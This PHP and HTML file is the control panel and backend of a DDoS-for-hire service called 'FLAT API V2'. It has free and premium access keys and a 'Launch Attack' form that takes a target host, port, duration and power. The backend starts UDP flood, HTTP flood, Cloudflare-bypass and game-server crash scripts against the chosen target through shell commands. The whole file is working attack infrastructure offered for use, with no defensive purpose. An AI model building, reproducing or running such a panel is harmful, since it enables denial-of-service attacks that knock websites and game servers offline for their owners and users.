<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Authentication
$valid_keys = [
    'free' => 'free_password',
    'premium' => 'premium_password'
];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['key'], $_GET['host'], $_GET['method'])) {
    $key = $_GET['key'];
    $host = $_GET['host'];
    $port = $_GET['port'] ?? 80;
    $method = strtoupper($_GET['method']);
    $time = $_GET['time'] ?? 60;
    $power = $_GET['power'] ?? 1;

    // Verify key
    if (!in_array($key, array_values($valid_keys))) {
        $response = ["error" => "Invalid key"];
    } else {
        $is_premium = ($key === $valid_keys['premium']);
        
        // Execute based on method
        switch($method) {
            case 'UDP':
                $script = "/root/.ssh/s/gudp";
                $cmd = escapeshellcmd("screen -dm $script $host $port");
                $output = shell_exec($cmd);
                break;
                
            case 'HTTP':
                $script = "/root/.ssh/s/data/HTTP-RAW.js";
                $cmd = escapeshellcmd("screen -dm node $script $host $time");
                $output = shell_exec($cmd);
                break;
                
            case 'CF':
                if (!$is_premium) {
                    $response = ["error" => "CF method requires premium access"];
                    break;
                }
                $script = "/root/.ssh/s/cf.js";
                $cmd = escapeshellcmd("screen -dm node $script $host $time $power");
                $output = shell_exec($cmd);
                break;
                
            case 'GAME':
                $cmd = escapeshellcmd("screen -dm ./GAME-CRASH $host $port");
                $output = shell_exec($cmd);
                break;
                
            default:
                $response = ["error" => "Method not supported"];
        }

        if (!isset($response)) {
            $response = ($output === null) 
                ? ["error" => "Failed to execute $method script"] 
                : ["success" => "Attack sent to $host ($method) for $time seconds"];
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADVANCED API DDOS</title>
    <style>
        :root {
            --primary:rgb(11, 78, 39);
            --premium:rgb(66, 6, 163);
            --danger: #e74c3c;
            --success: #2ecc71;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(38, 53, 26, 0.1);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #2c3e50, #4ca1af);
            color: white;
            padding: 20px;
            text-align: center;
        }
        .panel {
            display: flex;
            min-height: 500px;
        }
        .sidebar {
            width: 250px;
            background: #34495e;
            color: white;
            padding: 20px;
        }
        .main-content {
            flex: 1;
            padding: 20px;
        }
        .method-card {
            background: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(14, 83, 161, 0.1);
            border-left: 4px solid var(--primary);
        }
        .method-card.premium {
            border-left-color: var(--premium);
            background: #fffaf0;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .badge-free {
            background: var(--primary);
            color: white;
        }
        .badge-premium {
            background: var(--premium);
            color: white;
        }
        form {
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }
        button:hover {
            background: #2980b9;
        }
        button.premium {
            background: var(--premium);
        }
        button.premium:hover {
            background: #e67e22;
        }
        #response {
            margin-top: 20px;
            padding: 15px;
            border-radius: 4px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            text-align: center;
        }
        .stat-card {
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            flex: 1;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>FLAT API V2
            <p>Advanced api attack methods with bypass</p>
        </header>
        
        <div class="panel">
            <div class="sidebar">
                <h3>Attack Methods</h3>
                <div class="method-card">
                    <h4>UDP Flood</h4>
                    <p>HIGH PPS BASIC UDP</p>
                    <span class="badge badge-free">FREE</span>
                </div>
                <div class="method-card">
                    <h4>HTTP Flood</h4>
                    <p>Standard HTTPS HTTP, requests good for free</p>
                    <span class="badge badge-free">FREE</span>
                </div>
                <div class="method-card premium">
                    <h4>CF Bypass</h4>
                    <p>SIGMA BYPASS METHOD</p>
                    <span class="badge badge-premium">PREMIUM</span>
                </div>
                <div class="method-card">
                    <h4>GAME-CRASH</h4>
                    <p>Game server attack method</p>
                    <span class="badge badge-free">FREE</span>
                </div>
            </div>
            
            <div class="main-content">
                <div class="stats">
                    <div class="stat-card">
                        <h3>Total Attacks</h3>
                        <p id="total-attacks">0</p>
                    </div>
                    <div class="stat-card">
                        <h3>Successful</h3>
                        <p id="successful-attacks">0</p>
                    </div>
                    <div class="stat-card">
                        <h3>Failed</h3>
                        <p id="failed-attacks">0</p>
                    </div>
                </div>
                
                <form id="attack-form">
                    <div class="form-group">
                        <label for="key">Access Key</label>
                        <input type="password" id="key" name="key" placeholder="Enter your access key" required>
                    </div>
                    <div class="form-group">
                        <label for="host">Target URL/IP</label>
                        <input type="text" id="host" name="host" placeholder="example.com or 192.168.1.1" required>
                    </div>
                    <div class="form-group">
                        <label for="port">Port (Default: 80)</label>
                        <input type="number" id="port" name="port" placeholder="80" value="80">
                    </div>
                    <div class="form-group">
                        <label for="time">Duration (seconds)</label>
                        <input type="number" id="time" name="time" placeholder="60" value="60" min="10" max="600">
                    </div>
                    <div class="form-group">
                        <label for="power">Power (1-10)</label>
                        <input type="number" id="power" name="power" placeholder="1" value="1" min="1" max="10">
                    </div>
                    <div class="form-group">
                        <label for="method">Attack Method</label>
                        <select id="method" name="method" required>
                            <option value="">-- Select Method --</option>
                            <option value="UDP">UDP Flood</option>
                            <option value="HTTP">HTTP Flood</option>
                            <option value="CF">CF Bypass (Premium)</option>
                            <option value="GAME">GAME-CRASH</option>
                        </select>
                    </div>
                    <button type="submit" id="submit-btn">Launch Attack</button>
                </form>
                
                <div id="response"></div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('attack-form');
        const responseDiv = document.getElementById('response');
        let totalAttacks = 0;
        let successfulAttacks = 0;
        let failedAttacks = 0;

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(form);
            const params = new URLSearchParams(formData);
            
            // Show loading state
            const submitBtn = document.getElementById('submit-btn');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Launching...';
            
            fetch(`index.php?${params.toString()}`)
                .then(response => response.json())
                .then(data => {
                    totalAttacks++;
                    document.getElementById('total-attacks').textContent = totalAttacks;
                    
                    if (data.success) {
                        successfulAttacks++;
                        document.getElementById('successful-attacks').textContent = successfulAttacks;
                        showResponse(data.success, 'success');
                    } else {
                        failedAttacks++;
                        document.getElementById('failed-attacks').textContent = failedAttacks;
                        showResponse(data.error, 'error');
                    }
                })
                .catch(error => {
                    failedAttacks++;
                    document.getElementById('failed-attacks').textContent = failedAttacks;
                    showResponse('Network error: ' + error.message, 'error');
                })
                .finally(() => {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Launch Attack';
                });
        });
        
        function showResponse(message, type) {
            responseDiv.textContent = message;
            responseDiv.className = type;
            responseDiv.style.display = 'block';
            
            // Hide after 5 seconds
            setTimeout(() => {
                responseDiv.style.display = 'none';
            }, 5000);
        }
        
        // Update button for premium methods
        document.getElementById('method').addEventListener('change', function() {
            const submitBtn = document.getElementById('submit-btn');
            if (this.value === 'CF') {
                submitBtn.classList.add('premium');
                submitBtn.textContent = 'Launch Premium Attack';
            } else {
                submitBtn.classList.remove('premium');
                submitBtn.textContent = 'Launch Attack';
            }
        });
    </script>
</body>
</html>